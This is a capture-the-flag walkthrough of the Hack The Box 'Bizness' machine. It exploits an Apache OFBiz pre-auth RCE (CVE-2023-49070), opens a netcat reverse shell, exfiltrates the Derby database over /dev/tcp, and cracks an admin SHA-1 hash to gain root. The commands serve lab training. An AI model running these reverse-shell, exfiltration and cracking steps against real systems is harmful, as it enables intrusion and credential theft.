---
title: "Bizness"
difficulty: Easy
os: Linux
points: 20
rating: 2.8
date: 2024-01-06
avatar: assets/htb/bizness.png
tags: [Weak Credentials, Remote Code Execution, Misconfiguration, Insecure Design, Reconnaissance, Web Site Structure Discovery, Configuration Analysis, Password Reuse]
htb_url: https://app.hackthebox.com/machines/Bizness
---
**About**
### Machine Description

Bizness is an easy Linux box centered on a pre-authentication remote code execution (RCE) flaw in Apache OFBiz, tracked as `[CVE-2023-49070](https://nvd.nist.gov/vuln/detail/CVE-2023-49070)`. We abuse that bug to land a shell, then digging through the OFBiz configuration surfaces a hashed password stored in the service's Derby database. With a bit of research and code review, that hash is reshaped into a more standard form that common tools can crack. The recovered password then lets us log in as root.

### Area of Interest

Web ApplicationDatabasesCommon Applications

### Technology

NGINXApache OFBiz

### Vulnerabilities

Weak CredentialsRemote Code ExecutionMisconfigurationInsecure Design

### Security Tools

NetcathashcatNmap

### Languages

PythonJava

### Techniques

ReconnaissanceWeb Site Structure DiscoveryConfiguration AnalysisPassword ReusePassword Cracking

### CVE

CVE-2023-49070

## Summary

Bizness is an easy Linux box running Apache OFBiz behind an NGINX reverse proxy. The OFBiz 18.12 instance is vulnerable to a pre-authentication remote code execution flaw (CVE-2023-49070) in its deprecated XML-RPC component, which I exploit to land a shell as the `ofbiz` user. From there, I dig through the OFBiz configuration and its embedded Apache Derby database to recover the admin's SHA-1 password hash, reshape it into a hashcat-friendly format, crack it, and reuse the recovered password to become root.

## Enumeration

Before touching the target I set up a working directory and bring up the lab VPN. On the Desktop I make a folder named after the machine and a second folder inside it to hold scans and outputs, then connect with `openvpn htb_vpn.ovpn`.

```bash
su
echo "<YOUR_IP> bizness.htb" >> /etc/hosts

mkdir -p htb/bizness.htb
cd htb/bizness.htb
mkdir {nmap,content,exploits,scripts}
# At the end of the room
# To clean up the last line from the /etc/hosts file
sed -i '$ d' /etc/hosts
```

I like to kick off recon with a ping to the target, which confirms connectivity and gives us a hint about the OS.

```bash
ping -c 3 bizness.htb
PING bizness.htb (<YOUR_IP>) 56(84) bytes of data.
64 bytes from bizness.htb (<YOUR_IP>): icmp_seq=1 ttl=63 time=50.8 ms
64 bytes from bizness.htb (<YOUR_IP>): icmp_seq=2 ttl=63 time=56.0 ms
64 bytes from bizness.htb (<YOUR_IP>): icmp_seq=3 ttl=63 time=53.3 ms
```

From these three ICMP replies, the Time To Live (TTL) is around 64, which points to a **\*nix** host; Windows machines typically report a TTL near 128.

### Port scanning

Next I jump straight into an active port scan with nmap.

```bash
sudo nmap -p0- -sS -Pn -T4 -vvv bizness.htb -oN nmap/tcp_port_scan
```

```bash
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
80/tcp    open  http    syn-ack ttl 63
443/tcp   open  https   syn-ack ttl 63
45853/tcp open  unknown syn-ack ttl 63
```

The scan turns up 4 open TCP ports: 22, 80, 443, 45853. With those identified, I enumerate the services running on them.

```bash
sudo nmap -sV -sC -p 22,80,443,45853 bizness.htb -oN nmap/service_port_scan
```

```bash
ORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp    open  http       nginx 1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
|_http-server-header: nginx/1.18.0
443/tcp   open  ssl/http   nginx 1.18.0
|_http-title: 400 The plain HTTP request was sent to HTTPS port
| tls-alpn: 
|_  http/1.1
|_http-server-header: nginx/1.18.0
| tls-nextprotoneg: 
|_  http/1.1
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
|_ssl-date: TLS randomness does not represent time
45853/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web discovery

The web servers run nginx 1.18; I verify this and pull additional details with `whatweb bizness.htb`.

```bash
http://bizness.htb [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[<YOUR_IP>], RedirectLocation[https://bizness.htb/], Title[301 Moved Permanently], nginx[1.18.0]
https://bizness.htb/ [200 OK] Bootstrap, Cookies[JSESSIONID], Country[RESERVED][ZZ], Email[info@bizness.htb], HTML5, HTTPServer[nginx/1.18.0], HttpOnly[JSESSIONID], IP[<YOUR_IP>], JQuery, Lightbox, Script, Title[BizNess Incorporated], nginx[1.18.0]
```

Opening the site in a browser and reviewing the page source doesn't reveal anything obviously useful, and directory enumeration with Dirb is similarly quiet.

```bash
dirb https://bizness.htb 
```

What it does surface, however, is an interesting page hosting a login form, which also leaks the ERP backend in use: this is an Apache OFBiz instance.

<https://bizness.htb/accounting/control/main>

The OFBiz version is visible right on that page: **18.12**.

## Foothold

With the product and version in hand, searchsploit quickly turns up an exploit for this version of Apache OFBiz. Cross-referencing on Google, the first match is a 2024 CVE, but I want the 2023 pre-authentication RCE specifically, so searching for "ofbiz 18.12 CVE 2023" lands me on the NIST entry for CVE-2023-49070.

<https://nvd.nist.gov/vuln/detail/cve-2023-49070>

This is a pre-auth RCE in Apache OFBiz 18.12.09, stemming from the deprecated XML-RPC component still being present. The issue affects Apache OFBiz before 18.12.10, and the fix is to upgrade to version 18.12.10.

A PoC for exploiting it lives on GitHub at <https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass>, and it bundles everything we need: the PoC plus the `ysoserial-all.jar` tool. As always, be careful what you download; open source / GitHub does not mean a program is 100% harmless. I clone it locally.

```bash
git clone https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass.git
```

I check my attacker box IP with `ifconfig tun0`, start a listener with `nc -lvnp 1339`, and in another shell fire the exploit to spawn a `/bin/bash` reverse shell back to me.

```bash
python3 exploit.py --url https://bizness.htb --cmd 'nc -e /bin/bash 10.10.17.177 1339'
```

The shell that lands is running as the `ofbiz` service user.

```
ofbiz
```

Moving to that user's home directory with `cd ~` and reading the flag gives us our user proof.

```bash
cat user.txt
f17c************************c401
```

## Privilege Escalation

First I upgrade the shell into a more workable interactive one.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### Hunting the configuration and database

OFBiz is installed under `/opt/ofbiz`. Hunting through the configuration for the password hashing algorithm in use, the relevant file lives at `/opt/ofbiz/framework/security/config` and shows the application is configured to use **SHA**.

By default OFBiz uses an embedded **Apache Derby** database. Browsing the data-related folders confirms this: `/opt/ofbiz/runtime/data/derby/derby.log` holds the DB logs along with the database name and its version, and the Derby files themselves live under `/opt/ofbiz/runtime/data/derby`.

Digging into `/opt/ofbiz/runtime/data/derby/ofbiz/seg0` reveals a set of `.dat` files. Grepping them for an `admin` string narrows things down to the files likely holding sensitive administrative strings.

```bash
grep -a -l 'admin.$' *.dat
```

Inside a file called `c6650.dat` I find the admin credential blob:

```
admin$"$SHA$$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
```

### Extracting the hash with Derby tools

The `ij` utility doesn't appear to be present on the target, so I copy the `.dat` files over and install the Derby tools on my Kali attacker machine instead. First I archive the Derby directory:

```bash
tar cvf /dev/shm/derby.tar derby
```

Then transfer it over netcat — listener on the attacker side, send from the target:

```bash
nc -lvnp 4433 > derby.tar
cat /dev/shm/derby.tar > /dev/tcp/10.10.17.177/4433
```

With the database on my machine, I extract the archive:

```bash
tar -xvf derby.tar
```

and install `ij` to connect to it.

```bash
sudo apt-install derby-tools
ij
protocol 'jdbc:derby';
connect 'jdbc:derby:./ofbiz;create=true'; 
show tables;
```

In my case I had to tack on an extra flag (`create=true`) to get the connection to open properly; the base form of the connect command is `connect 'jdbc:derby:./ofbiz';`.

Querying the database confirms which table holds the admin user's SHA-1 hash — `OFBIZ.USER_LOGIN`:

```sql
select * from OFBIZ.USER_LOGIN;
describe OFBIZ.USER_LOGIN;
select USER_LOGIN_ID,CURRENT_PASSWORD FROM OFBIZ.USER_LOGIN;
```

which is, of course, the same value we already pulled from the `.dat` file: `$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I`.

### Cracking the hash

The hash `$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I` follows a SHA1-based format:

* `$SHA$`: indicates the use of the SHA-1 hashing algorithm.
* `d`: the salt used in the hashing process.
* `uP0_QaVBpDWFeo8-dRzDqRwXQ2I`: the Base64 URL-encoded hash. After decoding, this represents the actual hash value.

I decode the Base64 URL-encoded string into hex:

```bash
echo "uP0_QaVBpDWFeo8-dRzDqRwXQ2I" | base64 -d | xxd -p > hash.txt
```

Here `base64 -d` decodes the Base64 URL-encoded string and `xxd -p` converts the decoded bytes into plain hexadecimal, which is the form hashcat needs. The hex version of the hash is `b8fd3f41a541a435857a8f3e751cc3a91c174362`.

At this point we have the decoded hash and we know the salt (`d`). However, hashcat expects the input in the format `<hash>:<salt>`, so I assemble it accordingly:

```bash
echo 'b8fd3f41a541a435857a8f3e751cc3a91c174362:d' > hash.txt
```

Now I crack it with hashcat, passing `-m 120` since that maps to the hashing algorithm `sha1($salt.$pass)`.

```bash
hashcat -m 120 hash.txt /usr/share/wordlists/rockyou.txt
```

which recovers the password in cleartext: `b8fd3f41a541a435857a8f3e751cc3a91c174362:d:monkeybizness`. The root password is **monkeybizness**.

### Becoming root

Armed with the admin password, I switch to root with `su -` and grab the final flag.

```bash
cat root.txt
751f************************f9b7
```

---
